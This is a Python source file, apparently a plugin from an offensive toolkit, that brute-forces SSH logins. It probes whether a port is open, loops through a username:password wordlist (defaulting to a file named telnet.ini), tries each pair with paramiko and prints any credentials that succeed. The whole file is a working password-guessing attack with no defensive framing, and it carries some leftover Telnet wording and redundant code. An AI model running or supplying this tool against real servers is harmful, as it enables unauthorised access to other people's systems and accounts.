from settings import PLUGINS_PATH

import os
import paramiko
import socket


def ssh_connect(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"Checking with Username : {username} , Password : {password}")

    connection_success = False
    try:
        ssh.connect(
            host,
            port=port,
            username=username,
            password=password,
            timeout=10,
        )

    except paramiko.AuthenticationException:
        pass
    except socket.error as e:
        print(e)
    else:
        connection_success = True

    ssh.close()
    return connection_success


def ssh(host, port):
    print("1. Default Port (22)")
    print("2. Custom Port")
    choice = int(input("BruteForce >>"))
    if choice == 2:
        port = int(input("Enter the Custom Telnet Port : "))
    else:
        port = 22

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        connect = s.connect_ex((host, port))
        if connect != 0:
            print(f"[+] Port {port}: Closed")
            s.close()

        elif connect == 0:
            print(f"[+] Port {port}: Open")
            s.close()
            wordlist_file = input("Enter Wordlist location (Press Enter for Default Wordlist) : ")
            default_wordlist_file = os.path.join(
                PLUGINS_PATH,
                'webvuln',
                'src',
                'telnet.ini',
            )
            wordlist_file = wordlist_file if wordlist_file else default_wordlist_file
            with open(wordlist_file, 'r') as f:
                lines = f.readlines()

            for x in lines:
                username, password = x.split(':')
                password = password.strip("\n")

                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                print(f"Checking with Username : {username} , Password : {password}")

                try:
                    flag = ssh_connect(
                        host=host,
                        port=port,
                        username=username,
                        password=password,
                    )
                except KeyboardInterrupt:
                    print("\n User Interrupt! Exitting...")
                    return
                else:
                    if flag:
                        print()
                        print("Credentials Found")
                        print(f"Username : {username}")
                        print(f"Password : {password}")
                        print()
                    else:
                        print("Invalid Credentials")

    except socket.error as e:
        print(f"Error : {e}")
